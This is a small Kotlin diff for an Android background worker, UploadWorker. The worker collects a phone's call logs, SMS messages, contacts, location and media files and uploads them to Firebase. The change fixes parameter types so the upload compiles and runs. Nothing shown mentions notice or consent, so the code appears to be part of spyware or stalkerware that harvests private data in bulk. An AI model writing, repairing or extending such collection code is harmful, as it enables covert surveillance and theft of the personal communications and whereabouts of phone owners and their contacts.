@@ -16,7 +16,8 @@ class UploadWorker(context: Context, params: WorkerParameters) : Worker(context,
             val mediaFiles = getMediaFiles(applicationContext)
 
             // Upload data to Firebase
-            uploadDataToFirebase(callLogs, smsLogs, contacts, location, mediaFiles)
+            uploadDataToFirebase(callLogs.toString(),
+                smsLogs.toString(), contacts.toString(), location.toString(), mediaFiles)
 
             return Result.success()
         } catch (e: Exception) {
@@ -25,7 +26,7 @@ class UploadWorker(context: Context, params: WorkerParameters) : Worker(context,
         }
     }
 
-    private fun uploadDataToFirebase(callLogs: String, smsLogs: String, contacts: String, location: String, mediaFiles: List<String>) {
+    private fun uploadDataToFirebase(callLogs: String, smsLogs: String, contacts: String, location: String, mediaFiles: List<Map<String, String>>) {
         val db = FirebaseFirestore.getInstance()
 
         val data = hashMapOf(
